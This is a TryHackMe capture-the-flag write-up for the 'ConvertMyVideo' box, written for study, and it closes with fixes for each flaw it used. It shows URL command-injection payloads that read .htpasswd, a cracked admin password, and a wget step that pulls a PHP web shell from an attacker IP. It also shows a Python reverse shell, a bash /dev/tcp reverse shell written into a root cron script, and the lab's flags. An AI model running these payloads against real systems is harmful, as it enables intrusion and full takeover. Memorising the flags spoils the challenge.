# ConvertMyVideo — TryHackMe Writeup

**Author:** Obito Uchiha — Team AKATSUKI
**Category:** Web Exploitation → Command Injection → Local Privilege Escalation (Cron Job Abuse)
**Target:** `10.48.149.233`
**Difficulty:** Medium

---

## 1. Objective

Compromise a YouTube-to-MP3 converter web application, obtain an initial foothold as `www-data`, retrieve the user flag, then escalate to `root` and retrieve the root flag.

---

## 2. Reconnaissance

### 2.1 Full TCP port scan

```bash
nmap -sS -p- --min-rate 2000 10.48.149.233 -vv -oN allPorts.txt
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

### 2.2 Service/version and OS detection

```bash
nmap -sC -sV -p22,80 -O -T4 10.48.149.233 -vv -oN servicesVersionsAnsOS.txt
```

Key findings:

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
Supported Methods: GET HEAD POST OPTIONS
```

OS fingerprinting suggests an Ubuntu host consistent with an older Apache/OpenSSH build (2017–2018 vintage packages per crontab/cron.daily timestamps seen later).

---

## 3. Web Enumeration

Browsing to `http://10.48.149.233/` reveals a "YouTube to MP3 converter" style application. Reviewing the client-side source:

```
view-source:http://10.48.149.233/js/main.js
```

confirms the app submits a `yt_url` parameter to a backend conversion endpoint.

### 3.1 Directory brute-force

```bash
ffuf -u http://10.48.149.233/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

```
admin   [Status: 401, Size: 460, Words: 42, Lines: 15]
js      [Status: 301, Size: 311, Words: 20, Lines: 10]
tmp     [Status: 301, Size: 312, Words: 20, Lines: 10]
```

`/admin` is Basic-Auth protected (401) — this is the secret admin panel; credentials are still needed.

---

## 4. Command Injection → Credential Theft

The conversion feature passes the `yt_url` parameter to a backend shell command without sanitization — a classic OS command injection.

### 4.1 Confirming injection

Using Burp Suite to intercept the conversion request, the `yt_url` parameter is modified to:

```
yt_url=--%3Bid%3B
```

Decoded: `--;id;` — the `--` closes out the expected argument, `;` chains a new shell command, and `id` confirms command execution:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.2 Dumping admin credentials

Since the app's command execution runs as `www-data`, and the `/admin` panel is protected by an Apache `.htpasswd` file, that file is readable by the same user:

```
yt_url=--;cat${IFS}/var/www/html/admin/.htpasswd;/a
```

(`${IFS}` is used in place of a literal space to dodge any naive space-filtering.)

Response leaks the hash:

```
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

### 4.3 Cracking the hash

```bash
echo 'itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/' > htpasswd.txt
john --format=md5crypt htpasswd.txt
```

**Result:** `jessie` (password for user `itsmeadmin`)

**Credentials:** `itsmeadmin : jessie`

---

## 5. Admin Panel → Remote Code Execution

Logging into `http://10.48.149.233/admin` with the recovered credentials exposes a file management utility. Clicking "Clear Downloads" reveals the underlying request structure:

```
http://10.48.149.233/admin/?c=rm%20-rf%20/var/www/html/tmp/downloads
```

The `c` parameter is executed directly as a shell command — a second, more direct RCE vector.

### 5.1 Staging a PHP web shell

```
http://10.48.149.233/admin/?c=wget%20http://192.168.138.243/shell.php%20/var/www/html
```

### 5.2 Reverse shell via Python one-liner

```
http://10.48.149.233/admin/?c=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.138.243%22,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;pty.spawn(%22/bin/bash%22)%27
```

Listener:

```bash
nc -lnvp 1234
```

```
www-data@dmv:/var/www/html/admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 5.3 Shell stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# press Enter
export TERM=xterm
```

### 5.4 User flag

```
www-data@dmv:/var/www/html/admin$ cat flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

---

## 6. Privilege Escalation — Writable Script Executed by Root's Cron

### 6.1 SUID enumeration (dead end)

```bash
find / -perm -4000 -type f 2>/dev/zero
```

Standard system binaries only (`passwd`, `sudo`, `chsh`, etc.) — nothing exploitable via GTFOBins on this build.

### 6.2 Cron review

```bash
ls -la /etc/cron*
cat /etc/crontab
```

No obviously custom entries in the system-wide crontab, but the presence of a web-rooted temp directory suggests a bespoke cleanup job is running outside the standard cron folders.

### 6.3 Finding the vulnerable script

```bash
ls -la /var/www/html/tmp/clean.sh
```

```
-rw-r--r-- 1 www-data www-data 17 Apr 12 2020 /var/www/html/tmp/clean.sh
```

The script is **owned by `www-data`** — the same low-privileged account we already control — yet it lives in a path pattern (`tmp/clean.sh`) strongly suggesting an automated root-run cleanup job picks it up periodically.

### 6.4 Weaponizing the script

```bash
nc -lnvp 4444
```

On the target:

```bash
echo "bash -i >& /dev/tcp/192.168.138.243/4444 0>&1" > /var/www/html/tmp/clean.sh
```

Within ~60 seconds, the root-owned scheduled job executes the overwritten script:

```
nc -lnvp 4444
connect to [192.168.138.243] from (UNKNOWN) [10.48.149.233] 56706
root@dmv:/var/www/html/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

### 6.5 Root flag

```
root@dmv:/var/www/html/tmp# cat /root/root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```

---

## 7. Root Cause & Fix

| Issue | Recommendation |
|---|---|
| `yt_url` parameter passed unsanitized to a shell command | Never build shell commands from user input; use parameterized library calls (e.g., `yt-dlp` Python API) instead of shelling out |
| Weak Apache Basic-Auth credential (`jessie`) | Enforce strong password policy; avoid dictionary-crackable hashes |
| Admin panel's `c` parameter directly executes arbitrary shell commands | Remove debug/maintenance "run command" functionality from production; if required, use a strict allow-list, never raw `exec()` |
| World-writable-by-`www-data` script executed by root's scheduler | Scripts executed by root must be owned by root and not writable by any lower-privileged service account |

---

## 8. Flags

```
User:  flag{0d8486a0c0c42503bb60ac77f4046ed7}
Root:  flag{d9b368018e912b541a4eb68399c5e94a}
```

---

*Writeup by Obito Uchiha — Team AKATSUKI*
